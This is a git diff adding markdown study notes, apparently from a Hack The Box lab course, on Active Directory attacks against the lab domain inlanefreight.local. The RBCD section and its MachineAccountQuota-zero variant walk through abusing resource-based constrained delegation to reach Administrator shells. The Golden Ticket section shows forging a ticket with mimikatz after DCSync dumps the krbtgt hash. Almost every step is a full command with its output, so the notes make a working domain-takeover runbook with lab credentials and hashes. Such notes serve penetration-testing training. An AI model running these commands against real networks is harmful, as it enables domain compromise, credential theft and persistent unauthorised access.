@@ -1876,3 +1876,305 @@ Further reads:
 - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
 - https://blog.harmj0y.net/blog/
 
+### From Linux
+
+First, you need to create a computer account, which is possible because `ms-DS-MachineAccountQuoto` is set to 10 by default for authenticated users. The [addcomputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py) script from Impacket can be used for this.
+
+```bash
+d41y@htb[/htb]$ addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Successfully added machine account HACKTHEBOX$ with password Hackthebox123+!.
+```
+
+Then, you need to add this account to the targeted computer's trust list, which is possible because `carole.holmes` has `GenericAll` ACL on this computer. You can use the [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) Python script to do so:
+
+```bash
+d41y@htb[/htb]$ python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+                                                                                  
+[*] Starting Resource Based Constrained Delegation Attack against DC01$
+[*] Initializing LDAP connection to 10.129.205.35
+[*] Using inlanefreight\carole.holmes account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `HACKTHEBOX` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `DC01`
+[*] Delegation rights modified succesfully!
+[*] HACKTHEBOX$ can now impersonate users on DC01$ via S4U2Proxy
+```
+
+You can ask for a TGT for the created computer account, followed by a `S4U2Self` request to get a forwardable ticket, and then a `S4U2Proxy` request to get a valdi TGS ticket for a specific SPN on the targeted computer.
+
+```bash
+d41y@htb[/htb]$ getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+You will then use this TGT ticket by exporting the ticket's path to the `KRB5CCNAME` environment variable.
+
+```bash
+d41y@htb[/htb]$ export KRB5CCNAME=./Administrator.ccache
+```
+
+Then you can use any Impacket tool with this ticket, such as `psexec.py`, to get a remote shell as SYSTEM.
+
+```bash
+d41y@htb[/htb]$ psexec.py -k -no-pass dc01.inlanefreight.local
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[*] Requesting shares on dc01.inlanefreight.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file jCXbAmVs.exe
+[*] Opening SVCManager on dc01.inlanefreight.local.....
+[*] Creating service FYxR on dc01.inlanefreight.local.....
+[*] Starting service FYxR.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+#### When MachineAccountQuota is set to 0
+
+If you are unable to create a computer account or if the account you are targeting doesn't have an SPN, you can still perform the attack. Read [this](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html).
+
+First, you need to obtain a TGT using the account NT hash to retrieve the TGT session key. To get the NT hash from the password in plain text, you can use `pypykatz`:
+
+```bash
+d41y@htb[/htb]$ pypykatz crypto nt 'B3thR!ch@rd$'
+de3d16603d7ded97bb47cd6641b1a392
+```
+
+Next, retrieve the TGT using `getTGT.py`:
+
+```bash
+d41y@htb[/htb]$ getTGT.py INLANEFREIGHT.LOCAL/beth.richards -hashes :de3d16603d7ded97bb47cd6641b1a392 -dc-ip 10.129.205.35
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in beth.richards.ccache
+```
+
+Ensure that the KDC can decrypt your TGT by obtaining the Ticket Session Key. This key is crucial for the next steps, as it allows you to pass the current TGT's session key as the new NT hash:
+
+```bash
+d41y@htb[/htb]$ describeTicket.py beth.richards.ccache | grep 'Ticket Session Key'
+[*] Ticket Session Key            : 7c3d8b8b135c7d574e423dcd826cab58
+```
+
+With the knowledge of the TGT's Session key, you can change the user's password on the DC between the `S4U2Self` and `S4U2Proxy` requests. This involves using the `SamrChangePasswordUser` method to set the user's password to match the TGT session key, allowing the KDC to decrypt the ticket. To change the user's password to match the session key, you can use `changepasswd.py`:
+
+```bash
+d41y@htb[/htb]$ changepasswd.py INLANEFREIGHT.LOCAL/beth.richards@10.129.205.35 -hashes :de3d16603d7ded97bb47cd6641b1a392 -newhash :7c3d8b8b135c7d574e423dcd826cab58
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of INLANEFREIGHT.LOCAL\beth.richards
+[*] Connecting to DCE/RPC as INLANEFREIGHT.LOCAL\beth.richards
+[*] Password was changed successfully.
+[!] User will need to change their password on next logging because we are using hashes.
+```
+
+Finally, use the configured delegation to impersonate a high-privilege user and request a service ticket for the desired service, such as CIFS or LDAP, on the target machine.
+
+```bash
+d41y@htb[/htb]$ KRB5CCNAME=beth.richards.ccache getST.py -u2u -impersonate Administrator -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -no-pass INLANEFREIGHT.LOCAL/beth.richards -dc-ip 10.129.205.35
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
+```
+
+Wiht the new ticket, you can connect to the DC as the Administrator:
+
+```bash
+d41y@htb[/htb]$ KRB5CCNAME=Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+DC01
+```
+
+## Golden Ticket
+
+The Golden Ticket attack enables attackers to forge and sign TGTs using the `krbtgt` account's password hash. When these tickets get presented to an AD server, the information within them will not be checked at all and will be considered valied due to being signed with `krbtgt` account's hash. For example, it is possible to sign a ticket for a user that does not exist, such as `DoesNotExist`, have the ticket also say they are Domain Administrator, and request a TGS ticket which enables them to access remote machines. For stealth reasons, it is almost always better to utilize users that exist in the domain. However, putting fake information in the ticket can be a great way to the impact and the lack of monitoring an organization has around these events.
+
+One of the scariest things about the Golden Ticket is how often pentesters will gain access to this key; when performing `DCSYNC` or `SecretsDump`, the key is KRBTGT's NTLM hash. This account is special because changing its password has to be done twice and cannot be done in rapid succession. The AD forest must reach full convergence, meaning the change has to replicate across the entire domain before it can be changed again. This is because this key is used for DCs to authenticate with each other. It should happen within 10 hours, but organizations typically wait 24 hours to minimize the chance of any issue. Within that time Window, if the attacker notices it changed and they grab it again, the process will have to repeated.
+
+### Theory
+
+Following the TGT request, the DC sends the user back their TGT. The TGT is a piece of data that contains information about the user. All this information is contained in the PAC (_Privilege Attribute Certificate_).
+
+The PAC is copied into each TGS ticket so that service accounts know who they are dealing with. Therefore, this information must be adequately protected so users cannot arbitrarily change it.
+
+DCs use the key of the `krbtgt` account to encrypt TGTs; therefore, it is necessary to know the password of this account to modify a TGT. Within any AD environment, `krbtgt` is the most sensitive and vital account since it ensures that users belong to their appropriate/specific groups.
+
+This account is simple, without any particular rights, and by default, is deactivated. This los exposure better protects it.
+
+But what happens if an attacker steals the secret of the `krbtgt` account? Well, they can decipher any TGT, thus the PAC within it, arbitrarily modify its information and encrypt it again using the secret of `krbtgt`. This forged ticket is called a Golden Ticket.
+
+Forging a Golden Ticket is an excellent technique to maintain persistence within an AD environment. Once full domain compromise is achieved, an attacker can extract the NTLM hash of the `krbtgt` account using `DCSync`. This includes the domain name, domain SID, name and RID of the account to impersonate, and the RIDs of any groups the account should belong to; once you attain all four pieces of information, a Kerberos ticket can be forged for the target account.
+
+Using a "Pass the Ticket" attack, you can import the golden ticket to the current session to use tools in the context of the impersonated account. As an attacker, you can forge a ticket to impersonate a sensitive user, who, although privileged in access, may not be a member of heavily monitored groups, such as Domain Admins and Enterprise Admins.
+
+### Windows
+
+Different elements are needed to forge a Golden Ticket:
+
+1. Domain Name
+2. Domain SID
+3. Username to impersonate
+4. KRBTGT's hash
+
+You already know the domain name; get the domain's SID by using `Get-DomainSID` from `PowerView`:
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainSID
+
+S-1-5-21-2974783224-3764228556-2640795941
+```
+
+Then, you need to have a compromised `krbtgt` account one way or another to get its NTLM hash. You can use `mimikatz` to forge a Golden Ticket when you have this information. If you compromised an account with DCSync privileges, you can use mimikatz to get the `krbtgt` hash using the following command:
+
+```powershell
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /user:krbtgt /domain:inlanefreight.local
+[DC] 'inlanefreight.local' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 10/14/2022 6:51:29 AM
+Object Security ID   : S-1-5-21-2974783224-3764228556-2640795941-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 810d754e118439bab1e1d13216150299
+    ntlm- 0: 810d754e118439bab1e1d13216150299
+<SNIP>
+```
+
+You now have the `krbtgt` NTLM hash. To impersonate the Administrator account, you can use mimikatz to forge the Golden Ticket as follows:
+
+```
+mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
+
+User      : Administrator
+Domain    : inlanefreight.local (INLANEFREIGHT)
+SID       : S-1-5-21-2974783224-3764228556-2640795941
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 810d754e118439bab1e1d13216150299 - rc4_hmac_nt
+Lifetime  : 8/17/2020 2:52:10 PM ; 8/15/2030 2:52:10 PM ; 8/15/2030 2:52:10 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ inlanefreight.local' successfully submitted for current session
+mimikatz # exit
+Bye!
+```
+
+As you see on the last line, the Golden Ticket has been created and submitted for the current session. You can double-check this using the `klist` command.
+
+```powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0x3f22d82
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ inlanefreight.local
+        Server: krbtgt/inlanefreight.local @ inlanefreight.local
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 8/17/2020 14:52:10 (local)
+        End Time:   8/15/2030 14:52:10 (local)
+        Renew Time: 8/15/2030 14:52:10 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+So now you have a valid TGT indicating you are `Administrator` and stating that you belong to several groups, including `Domain Admins`. If you need to request a service, you'll ask for a TGS ticket using this TGT, and a copy of the forged PAC will be embedded in the TGS ticket. For example, if you want to access a server using WinRM, you'll have a remote shell as `Administrator`.
+
+```powershell
+PS C:\Tools> Enter-PSSession dc01
+[dc01]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+
+inlanefreight\administrator
+```
+
+And if you come back to your original shell, you can see that you now have a TGS ticket for the `HTTP/dc01` SPN as `Administrator`.
+
+```powershell
+[dc01]: PS C:\Users\administrator.INLANEFREIGHT\Documents> exit
+PS C:\Tools> klist
+
+Current LogonId is 0:0x3f22d82
+
+Cached Tickets: (2)
+
+#0>     Client: Administrator @ inlanefreight.local
+        Server: krbtgt/inlanefreight.local @ inlanefreight.local
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 8/17/2020 14:52:10 (local)
+        End Time:   8/15/2030 14:52:10 (local)
+        Renew Time: 8/15/2030 14:52:10 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+#1>     Client: Administrator @ inlanefreight.local
+        Server: HTTP/dc01 @ INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 8/17/2020 14:52:31 (local)
+        End Time:   8/18/2020 0:52:31 (local)
+        Renew Time: 8/24/2020 14:52:31 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: DC01
+```
+
